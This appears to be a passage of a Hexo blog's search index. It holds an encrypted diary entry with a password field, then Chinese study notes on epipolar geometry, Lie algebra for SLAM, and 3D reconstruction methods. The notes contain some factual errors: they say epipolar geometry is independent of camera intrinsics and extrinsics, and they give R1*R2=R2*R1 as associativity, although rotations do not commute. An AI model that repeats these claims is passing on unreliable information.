2d5957b9faf466415ebf171a277dbd33b5a1b28d1330dbe1b4c03d758fac3ded0906c83307d88d8b69ade3c9bcba7e4544276d318a9db78d44acc14a715a2fa8f075eef57703f17c9e45652724844d88bf75c88a4dc09d89fb4332dbca7f0c6fb6b303bf7d452b8df215c353f446ffcf1d94d4fea62b5a9fd2bd5c5c9eaaf080074df2cfd04f0565a1a325474673b9b8d4c638feb4ce284ec93995335a587decf30437fc3750560cc3f5b8e54c040b40bc39b7f382b427ef75909270411b96341f35886abb3fed206d069f98365dcb16a8c41f2c15dc37902116d438a8b25e2059bafe5e5f7df9a865957f430c1c47bab8753320cf31651d1f38f6566954b620f1b3a302e1c0bf442dc3be342f2831bb543514d1c59b43506aa344cd50038d0972342261b000e2fe3777465ecd1d8eacf15fecfc3c34a6d52d1e7b537eaddd5dacf9811a95e8997ab5c96163dcbcf961bb46d7874353f875651acaeb3f1bb7dea58f1e55cc5154bbb7ec0d304bb0a884b68381998078a9814d6bba6167715c7f0467fdcbbc75719bddfcd529a9f1f28c709d23ba8942cb367951a3f7912ba81ab3b10e8ddff07e1068cb3fbebddd23a9180f5a14bc79b4b5f634e2ef7383aa47bba327dcacdef0b689d4f9e25cf52c1a39cf31c9d371f0257dda7c57dbe305ac4c3d8af809226c8d5ae5e6274714817bf2b41620edf474b40f9237c63aad767d39b5b66ef77bd7fb98c31dab86e14910d6686ebe22c38ed7073fc8467e23841005eeea817cc3b63dfea63586c754ac76df1d31bbcae4f90b7d2523110a9cee62a0f1e5a2740e765b9c307ba5f7be66905638f0597928a197032a0f3f15b8608eaf7a493378e5c57f2f1a4844478a92ddb740735a7a6c61c007ae36cd1bd8a60da98c5e5a6b484b9d9a231e8871bf69517772abb47bb2b99e77f0dbd3566e646165a8cab5906ec35d38aee22bddc4261db4176b2b6e36f3cc6cd79432b494949e783fcf3e5b88ecd9da1782c36a2edc0d352b065961bc2603d68d984e22c3e7aab208b5b98d4799e594a8ce2109a94b6ad8f80daea44c7eaf2f0006f86b75c61a2f02a915b7f4426e5cd9d452c84f27a5f46982afba2ff261f42d717c7075681a826546f18b40f7a35ba525a77e47a5ef4c75defe7610841640c3a2b7b3b05f5b85fc23eefcdb9faa0a9cd779279595a56104f357188fdc0aa57f010527d30de83d5fe8331af1e22be96f976987fdd4b20bd904e60aa334b1d531a917f763f73d0a1f6e54e964c483044e8285923089ad9899d839cccb4c20e94e9a3013e76aafa48a506028fa5ca90de5bdf4b1368a135bda316cc293b1d81cde2f1f3442e99a90bbe66eec5536450581fdc46c62aebed959620659f4620c67072f0f7c0c50447f91e52cffde1de7a141c8657bbfcfcb3b4e6b3916acbe15958ad375babeeec2b76898931acd7bd5d91718af185d67d25bc2eb3a274d58125803f926b808d17d2791d2ee345d1c43e34b3a4af7e5b417d2c6c83df9e096344671d5b767131ac9c315336bb079de00e8b1451a241c5189fb58c0ace5eaf7ced12a3d7372e172a4420aa751423ce745baa5dc20f24dcddb43fdf25d9515c8a945a0e65aad39d31e5eb885292d115070c7e266765d71e369a7cb623038172c0a638ed568d4f58f85059b7acf91c61359c0d387abbfef39ff602450e5b87d504181a96c053dd14164de899a99cef18bf35a17f3ee92b7d1965e0c7f05aa12d98094164c5e10dac5b269b5bead95c3a6f3322dc1b8acb1d652ea02d30f84a0e941699baca0a84c0e82f7c96d650ec025187f7ee99c9fb8b6f7fb143a01abc7aa73334b55f52cccbaab9dbd5bebc0b53364db48d49f3900449432e79912a3bccd8e845946f4b96b2c8e1817e825c6d1bac17ddbec7424f2a537c3f3563ed3381cd062cbe5e0ca536220dc01cdee0248e0f83dda9a9593a886b4b3b101b2d036bc298015b828b2513e187b4e3f45b2721c31a6cbf6600f16614410a670285dbaf2d517bddee14f18768cdb85db81b86d4930573f4759c4380f29d30901cd1bd671a2b369019e2e0da2fe72fa1b4582c5ba0c44143651947c040474339c6eef7c565b520c3fd5d91832037debdc2cfd5ffd033c6d7e33bd7c57662063055df6f7a383bf39c0433b5e69ea73446c013a7e4dce200c38911bf172cd90693bb4ec35ccc68b390b995888e7e454243bd9914343dcf6e175bc8147c29669e4b86e38cd559cca00543abe773e7f5843df08d08669cf93821a9fadc0e02325253e539ddc440c79a3db3b42611d2a4de2c4a9018c4c2ac8d8777f0bc356400c74efe968bf4b8e298079c0d8fa7ee1f66a262e22b1952e104833cb190db317d645bef5ca0072fea4f007470b7aa847519e031b6183a2b02ab0c9e0419fdd9abb058862f5a332cdd48baf44ccb11a124173ec87189909c5d2a4eadf3e0b83296af03b4703a7f034fe14d085a1803d9b8cdaffcf5f3cadfc3763e80f2c7bc06e3602b17fbeeec1a34e012741e2588192c1467c5a3ea81ccfce0d681922910c9e5066a6ce23945496156d4058b21d25767d179f52b30df6e6e36aa49fd5469f7343a5fa93dec50843310965e506ed999d05f7aeeed892951fab7006273b50aa564d9760a3a659ab0b18ad7fce63b78399d6f45e93a570610ca05d8a82b4d00fbd12ecd56e85fb4e2455fcbb2b103f4f15dee0368a5f9e75acc2ebad209a53f11a0fd7de001de09433435a8765365f9e11df9cc718d0b39116f10b73980f1547dc462db12e9b8d582fb6a3827807d9a336abb205e1569b69e2fe7c82cc615e9b9e96fe3647684b95be904894f12c26e78678a72bd46d38bab0d5fd56ba5227900b0429772ae6c79b5006f17579ace8eaffd489bbd3c912d3ae87bf601032bf5e8c45db53db32090e536c6f53314fa5c8e869cc11a2fa9866f0519e4f03190090eafa645c94b01af331189a33f31e91e95a88c828922d466b593e0fcdd1932e692b82ba4e138a9448764cf64c8bafd4d3392ba37dde9580006310dccb7bfec258c2729ba2c506e0e75efa056692b7c49de0bb40a420b2f2657ce6be0b35ee7a26e641f2983eeccd822205720843782d2d296b9260142482883c6efff931138b854a33d923c897de95d2359bfb8c72af3f8ec328441d6358c3630fd1829b259440d3a16294d586e3e477b8c8fe4f96677f06d786e7269072136804902ed99065d50fb328d40597f26633f35defc9a887018a31ea371d90d238d3c9a2bfc5ae1f0925ffc30a3bf0dffd1c9bec4aa9cd1e2e7b11883f73735b866b0988081edac03c77692cff7372e376973dbe7a5cec8ed56e47ac9167bb7021838e6d581c6eb6f0b1017d07a3b4e6643bb582151717daa22d115f9267a25587357e55e2d8bf1c9d6f5e34bd4ae6235f18c6d02c60c663c0949e24973e62a310e7777db5726af03a0352b010c3692dc2eaca319ac474ab3c549ba5b2d8a7fa1cac06ee0054d26fe69dd836d924dd8ebab54c139c2c88d7c2bf51eedb7f25462bb964f0f0bf60463aebe2695e0f3f62202134323c547e72a9e5269ada57c1ad45e7e5025992e41a60aee78f779428ec406e1fd3b14192ba8542cf71189a9b638f01c0bd39cf0dc0048d7f9fbbeb128d83ec3bb675cb4a2523ec9c733ab288c192c8c9582de064f1722a405e1e1f32c3196e203c890f07055d7d0276176ce7937e7389648271b42f799b19d7206f32314bbc858c24b090c74a9c62b03fba17701a430dd0cf99e002f754d28c9720c40df8db42081c8e55beaa17149233468703855d814568ffb683c2a5d959d63c6ca9387ad568ecaec06d94bd592e5f69d0f31093a09d9c01dbc95e2536f2d055e3d2630bcc147ac67df2568da56457d436c97bc9707fb074258ca7b7d06a3ae2844f9d7a1c7a66a37e1309ecdd40532fdae441b96e6827a59ab5f1db942f7afbd5d0d8ec1e160d0f6f732901761fff5b1ad0874ca5df26dbb14d0752d895f946bf009ec1bb029e0577ef9d8525669282ccff58ebeec688b51396f33bac2ca7437aab8b5048df8d4b166ed34d1795f8a30daec5672e0f63c052fc0f7a2e7f5dca43bc82142d649137c510ceed719dc557a50a20543c6e142402f5a1b95270130ba5cc95f89f92c94736bffe3b1ea59c2397509cbc614ae04888689ae4bf341102ae299cadafef85db4e1c510ac43b05c39095b131faca09ca56e57db7b3c2cad0ed6fc2296469cb1e4e545d099cd63d9bd91e4e152ace1f08ee135dc0d4b86165d9c868d6e6ae13d2ab166b31e88cc3b2a0ebc6ffeaa0628d4e67008804a1b3091d2693c7921137acd313a33f5c29c286b676ea3677f146f65c972ab5ab6c0399999192a1a86a140223653a82f1e6e174813bda79404fa4ce71cfa579bb5055c86461c9ec85d56ded693de654e831a3b15e5c4ff23d507212141e0430dd934ce5d33bb3f8be75e6ec9b81200df475f533b317d8538d8eb12fff3a09d0256b739492e92b9c7502a8aaf368f93b7ce69198fcb26b52d833996447d43788dd61c64f03a8ec51c7d2cd88c3e8b42e95685b9a2496e84f7c1f1395573bf7fe03c1c2ff8c673819419f2bdc66cb17cb100866f9d8b29efebccd501ec4fa5e0da2f9c08515f96e3ae29890a71646e301201a1c6ccf1b829b24cf26aa107c9738bf117eb2114c8a8cc08ca42e9f1b3ab47e98c902b619dbfe703851fd1b63e682b96e5af3030e114e4a1e0155fdfd4a1479481a8215952d5a1d1644124622a444dc6a83fbce0262036fb3718f70f847bb727ab032ee5e3b8878c94a8f8d63bc4d62f6cadeb26a1eb6a12f434d885feb685102e19d17c8e702aafdc5408bbfbe41e58d1e5cdf8040a76366fcd419daf98500e3303b7e3adde21462e56d5471140f5f07e2a009dabbc35418bcb2ade4b574bb873bb91f22bfe21441f4cc0f095f30db394f3327a6cd48ba8a80154ce03b2ede772c037374eb6c7e428431114119cc81c245f954c8b0d800dde726340a87b6b48639268f36ab083ef849e11d58e8e334c344fd8d809d0590405dd835b1bd413d79cffcc1144d85036467efec1fd67401b89ba7bba3d097ecc652e2c3f7c8125ba6627ebb87937bd833ac3aa9efb921183699af0860628b81bfcbe245cd49535877fa488856d76ad451b1c9fb7dc517850d24280c22efbc0aea08ff06606d53797a1f9e29f976805f1d28e21e6c31b1e669bd69470a8a84123791f68edc70ba29717fce2f9464dc018abfc858ac1cdbdb57ee96b26e793ad3c74e86144d3f6a7dcc2d957aa7fdbb44d972ac61572420aba6b477fbfeddd983259cb7f77dd2ebb590077f64544ec7431e17b1587515a6a71c99bca4c5f46ff4a8e3532a61cf724d1ff82e94c6e9b436de01edb3e4078dde5db6a9380a7cd082182f2def59af765f8ba33c35489d89180a5039ab538853e823fd3c1fecb2349a8b5433e7c9abdffb3f13853c4decfd62d0c93061e9f5f4cc6d017d6ca5e46db5d98a85414d491cb21da411f0e3b99c5e2e0eb3c5ebc6acbfb25a4f6301722fa0322c20ba9fe6aa7b8e6e9addde2ce9bfcfb00e3783b2d4a37af85c184ca61a59c889ab3634e7288fb1064254445aa5e02f2ab99eb38ba7f24bba42ddf9c7b9597e9efadec3adc7fada6b7754ff46284934efadc98bb228dead7e4fccbc3babd83273a92c77d0fcf70bb9f9616dda870c8eff52c5405470c77cad73edc7bf55d09d2ce17b13e5f246deef1711fdd6493c76ae699eb81b7ee8acf26e2011b9e0bad414816507e7e1e03a1d995b92beefd5e9bbb11d78e89cc263c1ae78a0fa8512c52595f9d6e1febe7ca3561b4ad010271b7927a64ab1c30378e99855b35a4633b47a55855ba6b8850e4357f294d94b1f2643ad3825b58c416241971b5c</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
            <tag> 随想 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>双视图几何</title>
      <link href="2023/03/30/AI%E7%AE%97%E6%B3%95/%E5%8F%8C%E8%A7%86%E5%9B%BE%E5%87%A0%E4%BD%95/"/>
      <url>2023/03/30/AI%E7%AE%97%E6%B3%95/%E5%8F%8C%E8%A7%86%E5%9B%BE%E5%87%A0%E4%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="双视图几何"><a href="#双视图几何" class="headerlink" title="双视图几何"></a>双视图几何</h2><h2 id="1-对极几何-Epipolar-Geometry"><a href="#1-对极几何-Epipolar-Geometry" class="headerlink" title="1.对极几何 Epipolar Geometry"></a>1.对极几何 Epipolar Geometry</h2><h3 id="1-1-对极约束"><a href="#1-1-对极约束" class="headerlink" title="1.1.对极约束"></a>1.1.对极约束</h3><p>对极几何描述的是两视图之间的<strong>内存射影关系</strong>，同一个三维点在两个不同的视角下的像点存在着约束关系，如下图三维点$X$在两幅图像的像点分分别为$x,x’$<br><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/439761-20171230204450179-325041548.jpg"><br>对极几何主要涉及以下几个元素:</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20200915203916069.png" alt="image-20200915203916069"></p><ul><li>基线 Baseline，两个相机中心的连线$O_1O_2$称为基线</li><li>对极点 epipolar ，$e_1,e_2$是对极点，是基线和两个成像平面的交点，也就是两个相机在另一个成像平面的像点；$e_2$是右边的相机中心$O_2$在左边相机的像点，同样$e_1$是左边相机中心$O_1$在右边相机的像点。</li><li>对极平面 epipolar plane，两个相机的中心$O_1$和$O_2$，三维点$P$，以及其在两个相机的像点$P_1,P_2$，这5点必定在同一个对极平面上。当三维点$P$变化时，对极平面绕着基线旋转，形成对极平面束。</li><li>对极线 epipolar line ,对极平面和成像平面的交线，所有的对极线相交于极点。</li></ul><p>从上面的几何元素可知，对极几何和相机的内参、外参没有关系，和场景的结构也没有关系，<strong>仅和场景的一对匹配的像点有关系</strong>。</p><h3 id="1-2-基础矩阵"><a href="#1-2-基础矩阵" class="headerlink" title="1.2.基础矩阵"></a>1.2.基础矩阵</h3><p>给定一对图像（同一场景不同视角得到的图像），从上面的图可知，对于第一幅图像上的任一像点$P_1$，在第二幅图像中都有一条与之对应的对极线$l_2$，<strong>该对极线是像点$P$与过第一个相机中心$O_1$射线在第二幅图像上的投影</strong>，并且第二幅图像中与$P$相匹配的像点$P_2$必定在该对极线上。因此，存在一个像点$P$到另一个图像上对极线$l_2$的映射：$$P \rightarrow l_2 $$</p><p><strong>基础矩阵F表示的就是这种从点到直线的映射。</strong></p><p><strong>表示的就是这种从点到直线的映射。</strong></p><h3 id="归一化"><a href="#归一化" class="headerlink" title="归一化"></a>归一化</h3><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20200915115050457.png" alt="image-20200915115050457"></p><p>所谓的归一化的成像平面，就是将三维空间点的坐标都除以Z。<br> <img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/20190819110312740.png" alt="在这里插入图片描述"><br> <img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/20190819110329141.png" alt="在这里插入图片描述"><br>所有空间点坐标都转到了相机前单位距离处，这个平面就叫<strong>归一化的平面</strong>，之后再乘以焦距<em>f</em>，让归一化平面回到成像平面。</p><h3 id="重投影误差"><a href="#重投影误差" class="headerlink" title="重投影误差"></a>重投影误差</h3><p>考虑到n个三维空间点P和他们的投影p，我们希望计算R，t，用李代数表示为T 。假设某空间点</p><p>​                                            <img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20200915194454804.png" alt="image-20200915194454804">，</p><p>其投影的像素坐标为</p><p>​                                                <img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20200915194529013.png" alt="image-20200915194529013">，</p><p>像素位置与空间点位置的关系如下：</p><pre><code>                 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200615144012719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L291eWFuZ2FuZHk=,size_16,color_FFFFFF,t_70)</code></pre><center> <p>写成矩阵形式：<br>                                                 <img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20200915194614308.png" alt="image-20200915194614308"></p><p>由于相机位姿未知以及观测点的噪声，该等式存在一个误差。我们将误差求和，构建最小二乘问题，然后寻找做好的相机位姿，使它最小化：</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20200915194635660.png" alt="image-20200915194635660"></p><p>这个误差项就叫做<strong>重投影误差</strong>的和。</p><h2 id="2-相关数学知识"><a href="#2-相关数学知识" class="headerlink" title="2.相关数学知识"></a>2.相关数学知识</h2><h3 id="李代数"><a href="#李代数" class="headerlink" title="李代数"></a>李代数</h3><p><strong>李群、李代数与SLAM</strong> <a href="https://www.sohu.com/a/270402234_100007727">https://www.sohu.com/a/270402234_100007727</a> 关于李群李代数，其实<strong>高翔</strong>的<strong>《视觉SLAM十四讲》</strong>里推导什么的挺清楚了，下面就在高博的基础上用比较容易理解的语言讲述一下重点。</p><ul><li><p>SLAM的过程就是不断的估计相机的位姿和建立地图。其中，相机位姿也就是我们所说的<strong>变换矩阵T</strong>。</p></li><li><p>比如你拿着相机一边移动一边拍，假设某个时刻相机的位姿是T，它观察到一个在世界坐标系中的一个空间点p，并在相机上产生了一个观测数据z，那么</p><p><strong>z = Tp + noise</strong></p><p>noise是观测噪声。那么观测误差就是</p><p><strong>e = z - Tp</strong></p></li><li><p>假设我们总共有N个这样的三维点p和观测值z，那么我们的目标就是寻找一个最佳的位姿T，使得整体误差最小化，也就是<img src="http://5b0988e595225.cdn.sohucs.com/images/20181022/fb14025cf4ee46d89236054fbfca4e04.png" alt="img"></p><p>求解此问题，就是求目标函数 **J **对于变换矩阵T的导数。（对矩阵求导）</p></li><li><p>我们先来看看<strong>变换矩阵T</strong>，我们知道T所在的SE(3)空间，对加法计算并不封闭，也就是说任意两个变换矩阵相加后并不是一个变换矩阵，这主要是因为旋转矩阵对加法是不封闭造成的，它是有约束的。</p></li><li><p>李代数就是解决之前那个问题的。我们把大写SE(3)空间的T映射为一种叫做李代数的东西，映射后的李代数我们叫做小se(3)好了。它是由向量组成的，我们知道向量是对加法封闭的。这样我们就可以通过对李代数求导来间接的对变换矩阵求导了。</p></li></ul><h3 id="群"><a href="#群" class="headerlink" title="群"></a>群</h3><ul><li><p>群（group）就是一种<strong>集合</strong>加上一种<strong>运算</strong>的代数结构。群有几个运算性质，好像高博说是<strong>“凤姐咬你”（封闭性，结合律，幺元，还有逆）</strong></p></li><li><p>比如旋转矩阵和乘法就构成了旋转矩阵群，变换矩阵和乘法也构成了变换矩阵群. 旋转矩阵和加法他们不满足封闭性,所以不能构成群，下面仔细解释原因：</p><ul><li><p>我们知道旋转矩阵R本身有一定的约束：</p><p><img src="http://5b0988e595225.cdn.sohucs.com/images/20181022/9521b8049ac848c39bfe43c604c20f97.png" alt="img"></p><p>两个旋转矩阵R1+R2的结果就不能满足上述约束了，但是R1<em>R2满足。此外，旋转矩阵还满足结合律：R1</em>R2=R2*R1，还有幺元是单位矩阵I，也有逆矩阵满足R乘以R的逆等于幺元（单位阵）。还有，我们在SLAM里最常说的有两个，一个是特殊正交群SO(3)，也就是旋转矩阵群，还有特殊欧氏群SE(3)，也就是变换矩阵群，3代表是三维的。</p></li></ul></li></ul><h3 id="李群"><a href="#李群" class="headerlink" title="李群"></a>李群</h3><ul><li>李群的定义是指连续光滑的群，比如我们前面说的旋转矩阵群SO(3)，你想象你拿个杯子就可以在空间中以某个支点连续的旋转它，所以SO(3)它就是李群。如果你一边旋转一边移动它，也是连续的或者说光滑的运动，所以变换矩阵群SE(3)也是李群。</li></ul><h3 id="李群与李代数的关系"><a href="#李群与李代数的关系" class="headerlink" title="李群与李代数的关系"></a>李群与李代数的关系</h3><ul><li>他们之间的确存在某种微分关系。我们先把结论放这里：<strong>李代数对应李群的正切空间，它描述了李群局部的导数</strong>。</li><li><strong>缘由:<strong>个人的理解是这样的，我们相机在三维空间中是连续的旋转或者变换，而我们SLAM目的就是优化求解相机的这个最佳的位姿T（变换矩阵），优化方法一般都采用</strong>迭代优化</strong>的方法，每次迭代都更新一个位姿的增量delta，使得<strong>目标函数</strong>最小。这个delta就是通过误差函数对T微分得到的。也就是说我们需要<strong>对变换矩阵T求微分（导数）</strong>，我们先以SO(3)空间中的旋转矩阵 R为例来说，如何对R求微分呢？这里就用到了李代数，可以说<strong>李代数对应了李群的导数</strong>，具体可以看十四讲中65-66页那部分的推导，我们只关注下面两个结论就行了：</li></ul><h4 id="两个结论"><a href="#两个结论" class="headerlink" title="两个结论"></a>两个结论</h4><h5 id="1-李代数空间描述李群空间的局部导数"><a href="#1-李代数空间描述李群空间的局部导数" class="headerlink" title="1. 李代数空间描述李群空间的局部导数"></a>1. 李代数空间描述李群空间的局部导数</h5><p>看下面的公式，我们发现旋转矩阵的微分是一个反对称(也叫斜对称)矩阵左乘它本身，也印证了我前面说的，矩阵是可以微分的。<strong>对于某个时刻的R(t)（李群空间），存在一个三维向量φ=（φ1，φ2，φ3）（李代数空间），用来描述R在t时刻的局部的导数</strong>。<img src="http://5b0988e595225.cdn.sohucs.com/images/20181022/10931840e7df4b68b1ef30ddabb85815.png" alt="img"></p><ul><li><p>反对称矩阵是啥？</p><ul><li>反对称矩阵英文是skew symmetric matrix，有的地方也翻译为斜对称矩阵。</li></ul><ul><li><p>反对称矩阵其实是将三维向量和三维矩阵建立对应关系。它是这样定义的：如果一个3 X 3的矩阵A满足如下式子：</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20200915094301999.png" alt="image-20200915094301999"></p><p>那么A就是反对称矩阵。你看左边有个转置，右边有个负号，叫反对称矩阵，还是挺形象的。</p></li></ul><ul><li><p>其实矩阵A中非对角线元素只用3个元素就可以表示。也就是说<strong>反对称矩阵A只有3个自由度</strong>。这样我们就可以<strong>把一个三维向量和一个三维矩阵建立对应关系:</strong></p><p>我们定义对应的一个三维向量：</p><p><img src="http://5b0988e595225.cdn.sohucs.com/images/20181022/2f8533a987ad4b8092c6cbe12df0952e.png" alt="img"></p><p>然后我们用一个上三角符号来表示这个向量α和三维矩阵A的对应关系</p><p><img src="http://5b0988e595225.cdn.sohucs.com/images/20181022/9c520d2cb76c43b58b4d41c27a99c82f.png" alt="img"></p><p>通过这个符号，我们把向量和矩阵建立了对应关系。这个在后面非常重要。你再看看前面的第一个结论</p><p><img src="http://5b0988e595225.cdn.sohucs.com/images/20181022/bc2e937d7f654f9d87236c20c7d5b149.png" alt="img"></p><p>就好理解很多了。</p></li></ul></li></ul><h5 id="2、指数映射"><a href="#2、指数映射" class="headerlink" title="2、指数映射"></a>2、指数映射</h5><ol><li>下面说说第二个结论。通过高博一系列辛苦的计算（笑），我们最终得到下面式子，<strong>它的前提是R在原点附近的一阶泰勒展开，我们看到这个向量φ=（φ1，φ2，φ3）反应了R的导数性质，故称它在SO(3)上的原点 φ0 附近的正切空间上。这个φ正是李群大SO(3)对应的李代数小so(3)。</strong></li></ol><p><img src="http://5b0988e595225.cdn.sohucs.com/images/20181022/8ab02a0f36a14d5597e704a9ba41ae0f.png" alt="img"></p><p>​    理解</p><ul><li><p>李代数小so(3)是三维向量φ的集合，每个向量φi的反对称矩阵都可以表达李群(大SO(3))上旋转矩阵R的导数，而R和φ是一个指数映射关系。也就是说，李群空间的任意一个旋转矩阵R都可以用李代数空间的一个向量的反对称矩阵指数来近似。</p></li><li><p>只要记得用旋转矩阵表示的话就是李群空间，也是我们熟悉的表示方法。而用向量的反对称矩阵表示的话就是李代数空间，这两个空间建立了联系。</p></li></ul><ol start="2"><li>如何计算：</li></ol><p><img src="http://5b0988e595225.cdn.sohucs.com/images/20181022/b81af0405e244e36ab2638b4ecbbab9f.png" alt="img"></p><ul><li><p>其实就只用到指数e的泰勒展开<img src="http://5b0988e595225.cdn.sohucs.com/images/20181022/f232e6729fd748278f99af8a86fbc8ac.jpeg" alt="img"></p><p>先不管具体推导过程，我们先来看看结论，通过运用泰勒展开，以及反对称矩阵的性质，我们可以得到如下结果：<img src="http://5b0988e595225.cdn.sohucs.com/images/20181022/369ce4a7b4a2419194eec9fbb11b53de.png" alt="img"></p><p>其中：三维向量 φ = θa，a是一个长度为1的方向向量。看到这个式子有没有觉得很神奇？这个式子和<strong>罗德里格斯公式</strong>长的一模一样：</p></li><li><p>还记得旋转的表示方法吗？有旋转矩阵、旋转向量、欧拉角、四元数，而<strong>罗德里格斯公式是表示从旋转向量到旋转矩阵的转换过程</strong>的。旋转向量也有一个旋转角θ，旋转轴也是单位方向向量，其实<strong>旋转向量就是这里的李代数</strong>。</p></li></ul><ol start="3"><li>的确<strong>小so(3)的李代数空间就是由旋转向量组成的的空间，其物体意义就是旋转向量。而前面结论二中的指数映射关系就是罗德里格斯公式，他们在数学上本质是一样</strong>的。</li></ol><ul><li>这样我们可以说旋转矩阵的导数可以由其对应的旋转向量指定，指导如何在旋转矩阵中进行微积分运算。</li><li>反过来，用对数映射也能把大SO(3)李群空间中元素映射到小so(3)李代数空间中去。前面我们都是讲的SO(3)上的映射关系，放到SE(3)上推导类似，也是泰勒展开，旋转矩阵R映射结果和SO(3)一样，平移部分指数映射后会有稍许的不同，它前面多了一个系数矩阵，这些都可以自己证明一下</li></ul><h4 id="一个图"><a href="#一个图" class="headerlink" title="一个图"></a>一个图</h4><p><img src="http://5b0988e595225.cdn.sohucs.com/images/20181022/23a1258b2ff246b0aa6784c3a53f7d8b.jpeg" alt="这个图要理解透彻"></p><h5 id="关于扰动模型的一点阐述"><a href="#关于扰动模型的一点阐述" class="headerlink" title="关于扰动模型的一点阐述"></a>关于扰动模型的一点阐述</h5><ul><li><p>李代数求导分两种：一种是用李代数表示位姿，然后根据李代数加法来对李代数求导（<strong>李代数是由向量组成的，向量对加法运算是封闭的</strong>。）。这种方法书中也推导了，结果中有复杂的雅克比公式，不是很方便。</p></li><li><p>一般都用第二种，就是<strong>对李群进行左乘或者右乘微小的扰动，然后对该扰动求导</strong>。书上高博也推导了，结果还是挺简洁的。扰动模型比较实用方便。扰动模型的推导一定要自己推一遍。</p></li></ul><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/1c24ebf69157458ba6c44b26c70aedfa.jpeg" alt="img"></p><p>附：</p><ul><li>以上内容参考了高博的《视觉SLAM十四讲》，SLAM入门必备</li><li>半闲居士有一些关于李代数，群，李群的讲解，貌似不错的样子<a href="https://www.cnblogs.com/gaoxiang12/p/5137454.html">https://www.cnblogs.com/gaoxiang12/p/5137454.html</a></li></ul><h2 id="3-基于SfM-Structure-from-motion-的三维重建"><a href="#3-基于SfM-Structure-from-motion-的三维重建" class="headerlink" title="3.基于SfM(Structure from motion)的三维重建"></a>3.基于SfM(Structure from motion)的三维重建</h2>]]></content>
      
      
      <categories>
          
          <category> AI算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 三维重建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>三维重建</title>
      <link href="2023/03/30/AI%E7%AE%97%E6%B3%95/%E4%B8%89%E7%BB%B4%E9%87%8D%E5%BB%BA/"/>
      <url>2023/03/30/AI%E7%AE%97%E6%B3%95/%E4%B8%89%E7%BB%B4%E9%87%8D%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="三维重建方法综述"><a href="#三维重建方法综述" class="headerlink" title="三维重建方法综述"></a>三维重建方法综述</h2><h3 id="1、基于扫描的3D重建"><a href="#1、基于扫描的3D重建" class="headerlink" title="1、基于扫描的3D重建"></a>1、基于扫描的3D重建</h3><p>扫描中直接获取深度信息，然后和2D信息一起建立3D模型，比如CT，MRI扫描。</p><h3 id="2、基于红外的3D重建Time-of-Flight"><a href="#2、基于红外的3D重建Time-of-Flight" class="headerlink" title="2、基于红外的3D重建Time of Flight"></a>2、基于红外的3D重建Time of Flight</h3><p>利用红外传感器获取深度信息，结合2D信息可以重建3D模型，比如微软发布的Kinect。</p><h3 id="3、基于2D图像的3D重建："><a href="#3、基于2D图像的3D重建：" class="headerlink" title="3、基于2D图像的3D重建："></a>3、基于2D图像的3D重建：</h3><p>我们知道从3D到2D是一个Projection的过程，当相机的位置和方向固定，光源的位置和方向固定时，得到的2D图像是确定的。反过来，只知道2D图像，3D的模型则由于相机光源的信息未知而具有很大的不确定性。基于2D图像的3D重建又可以分为以下几个类型。</p><h4 id="3-1、Shape-from-Shading-单视图-阴影-确定surface"><a href="#3-1、Shape-from-Shading-单视图-阴影-确定surface" class="headerlink" title="3.1、Shape from Shading 单视图 阴影 确定surface"></a>3.1、Shape from Shading 单视图 阴影 确定surface</h4><p> 相机和光源的位置和方向已知的情况下，2D图像的亮度是深度和平面法向量的函数：其中I表示亮度，（x,y,z）是该点的位置信息，n是该点所在面的法向量，s和v分别是光源和</p><p>​     相机的方向，通过以下式子可以求出深度信息z。该方法只需要一张2D图即可。该方法只能重建 surface。</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/v2-5e349b2c14b7d96d154b96756ddc13f5_b.jpg" alt="img"></p><h4 id="3-2、Shape-from-Silhouettes-侧影-多视图"><a href="#3-2、Shape-from-Silhouettes-侧影-多视图" class="headerlink" title="3.2、Shape from Silhouettes(侧影)-多视图"></a>3.2、Shape from Silhouettes(侧影)-多视图</h4><p>下图中锥形的物体叫做Visual  Hull，是包含物体，并且与物体一个方向上的轮廓是内切的，3D内切线的二维投影就是2D图像上物体的边缘。当知道2D的物体边缘和相机的位置，便可以还原一个方向上的3D内切线。当将很多方向的2D边缘进行3D还原，则可以得到很多方向上的3D内切线，进而得到3D模型。该方法要求相机信息已知，并且需要多个角度的2D边缘。</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/v2-b7e74b54edd5d0c531e58c01be67deb9_b.jpg" alt="img"></p><h4 id="3-3、Shape-from-DE-focus-距离产生blur模糊确定深度"><a href="#3-3、Shape-from-DE-focus-距离产生blur模糊确定深度" 